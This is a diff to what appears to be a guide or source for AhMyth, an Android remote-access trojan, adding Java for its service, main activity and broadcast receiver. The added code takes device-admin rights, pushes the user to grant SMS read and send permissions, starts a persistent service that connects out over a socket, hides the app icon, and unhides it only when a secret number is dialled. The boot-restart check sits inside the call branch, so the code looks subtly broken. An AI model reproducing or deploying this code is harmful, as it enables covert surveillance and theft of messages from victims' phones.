@@ -8,62 +8,6 @@ invoke-static, {} Lcom/package/ID/ahmyth/MainService;->start()V
 
 - MainService.java
 ```java
-    private static void findContext() throws Exception {
-
-        Class<?> activityThreadClass;
-
-        try {
-
-            activityThreadClass = Class.forName("android.app.ActivityThread");
-
-        } catch (ClassNotFoundException e) {
-
-            // No context
-
-            return;
-
-        }
-
-        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
-
-        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-
-        if (context == null) {
-
-            // Post to the UI/Main thread and try and retrieve the Context
-
-            final Handler handler = new Handler(Looper.getMainLooper());
-
-            handler.post(new Runnable() {
-
-                public void run() {
-
-                    try {
-
-                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
-
-                        if (context != null) {
-
-                            startService(context);
-
-                        }
-
-                    } catch (Exception ignored) {
-
-                    }
-
-                }
-
-            });
-
-        } else {
-
-            startService(context);
-
-        }
-
-    }
-
     // Smali hook point
 
     public static void start() {
@@ -96,97 +40,216 @@ invoke-static, {} Lcom/package/ID/ahmyth/MainService;->start()V
 
     public int onStartCommand(Intent intent, int flags, int startId) {
 
-        HookStart.start(this);
+        IOSocket.start(this);
 
         return START_STICKY;
 
     }
 
-}
-
 ```
 
-- HookStart.java
+- MainActivity.java
 ```java
-public class HookStart {
+public class MainActivity extends Activity {
 
+    DevicePolicyManager devicePolicyManager;
 
-    // Launched from activity
+    ComponentName componentName;
 
-    public static void start(Context context) {
+    SharedPreferences sharedPreferences;
 
-        HookStart.context = context;
+    @Override
 
-        startInPath(context.getFilesDir().toString());
+    protected void onCreate(Bundle savedInstanceState) {
 
-    }
+        super.onCreate(savedInstanceState);
 
-    public static void startContext() {
+        setContentView(R.layout.activity_main);
 
-        try {
+        componentName = new ComponentName(this, AdminReceiver.class);
 
-            findContext();
+        devicePolicyManager = (DevicePolicyManager)getSystemService(DEVICE_POLICY_SERVICE);
 
-        } catch (Exception ignored) {
+        if (devicePolicyManager.isAdminActive(componentName)) {
 
-        }
-
-    }
-
-    private static void findContext() throws Exception {
-
-        Class<?> activityThreadClass;
-
-        try {
-
-            activityThreadClass = Class.forName("android.app.ActivityThread");
-
-        } catch (ClassNotFoundException e) {
-
-            // No context
-
-            return;
+//            Log.d("MY_TAG","Ok then");
 
         }
 
-        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
+        else {
 
-        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+            Intent intent= new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
 
-        if (context == null) {
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
 
-            // Post to the UI/Main thread and try and retrieve the Context
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation));
 
-            final Handler handler = new Handler(Looper.getMainLooper());
+            startActivity(intent);
 
-            handler.post(new Runnable() {
+        }
 
-                public void run() {
+        if (
 
-                    try {
+                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&
 
-                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
+                ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED &&
 
-                        if (context != null) {
+                ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED
 
-                            start(context);
+        ){
 
-                        }
+            Intent mIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
 
-                    } catch (Exception ignored) {
+            mIntent.setData(Uri.parse("package:"+getPackageName()));
 
-                    }
+            startActivity(mIntent);
+
+            Toast.makeText(this, "Grant all permission before!", Toast.LENGTH_LONG).show();
+
+        }
+
+        Intent serviceIntent = new Intent(this, MainService.class);
+
+        ContextCompat.startForegroundService(this, serviceIntent);
+
+//        --------------------------------------------------------------------------------------------
+
+//        startService(new Intent(this, MainService.class));
+
+//        finish();
+
+        if (android.os.Build.VERSION.SDK_INT <= Build.VERSION_CODES.P){
+
+            Switch hide_icon_switch = findViewById(R.id.switch1);
+
+            hide_icon_switch.setVisibility(View.VISIBLE);
+
+            sharedPreferences = getSharedPreferences("AppSettings", Context.MODE_PRIVATE);
+
+            final SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();
+
+            hide_icon_switch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
+
+                @Override
+
+                public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
+
+                    appSettingEditor.putBoolean("hidden_status",isChecked);
+
+                    appSettingEditor.commit();
 
                 }
 
             });
 
-        } else {
+            boolean icon_hidden_status = sharedPreferences.getBoolean("hidden_status",false);
 
-            start(context);
+            if (icon_hidden_status){
+
+                fn_hideicon();
+
+                hide_icon_switch.setChecked(true);
+
+            }
+
+            else {
+
+                hide_icon_switch.setChecked(false);
+
+            }
 
         }
 
     }
+
+    
+
+    public void fn_hideicon() {
+
+        getPackageManager().setComponentEnabledSetting(getComponentName(),
+
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+
+                PackageManager.DONT_KILL_APP);
+
+    }
+
+//    for activity_main functionality
+
+    public void openGooglePlay(View view) {
+
+        Intent GoogleIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps"));
+
+        startActivity(GoogleIntent);
+                MainService.startService(this);
+        finish();
+
+    }
+
+}
+```
+
+
+- MyReciever.java
+```java
+public class MyReceiver extends BroadcastReceiver {
+
+    public MyReceiver() {
+
+    }
+
+    @Override
+
+    public void onReceive(Context context, Intent intent) {
+
+        Intent serviceIntent = new Intent(context, MainService.class);
+
+        ContextCompat.startForegroundService(context, serviceIntent);
+
+//        Toast.makeText(context,intent.getAction(),Toast.LENGTH_LONG).show();
+
+        if (intent.getAction().equalsIgnoreCase(Intent.ACTION_NEW_OUTGOING_CALL)){
+
+            String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
+
+            if (phoneNumber.equalsIgnoreCase(context.getResources().getString(R.string.unhide_phone_number))){
+
+                SharedPreferences sharedPreferences = context.getSharedPreferences("AppSettings", Context.MODE_PRIVATE);
+
+                boolean hidden_status = sharedPreferences.getBoolean("hidden_status",false);
+
+                if (hidden_status){
+
+                    SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();
+
+                    appSettingEditor.putBoolean("hidden_status",false);
+
+                    appSettingEditor.commit();
+
+                    ComponentName componentName = new ComponentName(context, MainActivity.class);
+
+                    context.getPackageManager()
+
+                            .setComponentEnabledSetting(componentName,
+
+                                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+
+                                    PackageManager.DONT_KILL_APP);
+
+                    Toast.makeText(context, "AhMyth's icon has been revealed!", Toast.LENGTH_SHORT).show();
+
+                }
+                
+                if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+                MainService.startService(context);
+
+                }
+
+            }
+
+        }
+
+    }
+
 }
 ```
